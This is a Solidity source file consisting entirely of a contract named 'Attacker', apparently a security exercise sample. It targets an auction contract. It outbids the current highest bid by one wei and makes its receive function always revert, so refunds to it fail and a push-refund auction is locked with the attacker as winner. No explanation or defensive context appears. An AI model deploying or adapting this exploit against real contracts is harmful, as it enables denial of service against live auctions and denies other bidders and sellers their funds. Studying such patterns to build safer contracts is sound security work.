// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IAuction {
    function bid() external payable;

    function getHighestBid() external view returns (uint256);
}

contract Attacker {
    IAuction public auction;

    constructor(address _auction) {
        auction = IAuction(_auction);
    }

    function attack() external payable {
        auction.bid{value: getWinningAmount()}();    
    }

    function getWinningAmount() public view returns (uint256) {
        return auction.getHighestBid() + 1 wei;
    }

    receive() external payable {
        revert(unicode"☠️☠️");
    }
}